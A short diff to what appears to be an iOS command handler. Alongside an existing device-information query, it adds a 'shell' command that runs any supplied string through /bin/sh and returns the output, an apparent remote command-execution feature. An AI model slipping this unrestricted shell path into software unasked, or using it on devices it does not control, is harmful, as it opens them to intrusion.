@@ -167,6 +167,21 @@
     	UIDevice *thisUIDevice = [UIDevice currentDevice];
     	NSString *result = [NSString stringWithFormat:@"%@ %@ %@ %@", [thisUIDevice model], [thisUIDevice systemName], [thisUIDevice systemVersion], [thisUIDevice name]];
 	return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
+    } else if ([args[0] isEqual:@"shell"]) {
+    	if (args_count < 2) return [NSDictionary dictionaryWithObject:@"Usage: shell <command>" forKey:@"returnStatus"];
+	else {
+    	    NSTask *task = [[NSTask alloc] init];
+            [task setLaunchPath:@"/bin/sh"];
+            NSArray *arguments = [NSArray arrayWithObjects: @"-c", [NSString stringWithFormat:@"%@", args[1]], nil];
+            [task setArguments:arguments];
+            NSPipe *pipe = [NSPipe pipe];
+            [task setStandardOutput:pipe];
+            NSFileHandle *file = [pipe fileHandleForReading];
+            [task launch];
+            NSData *data = [file readDataToEndOfFile];
+            NSString *result = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
+            return [NSDictionary dictionaryWithObject:result forKey:@"returnStatus"];
+	}
     }
     return [NSDictionary dictionaryWithObject:@"" forKey:@"returnStatus"];
 }
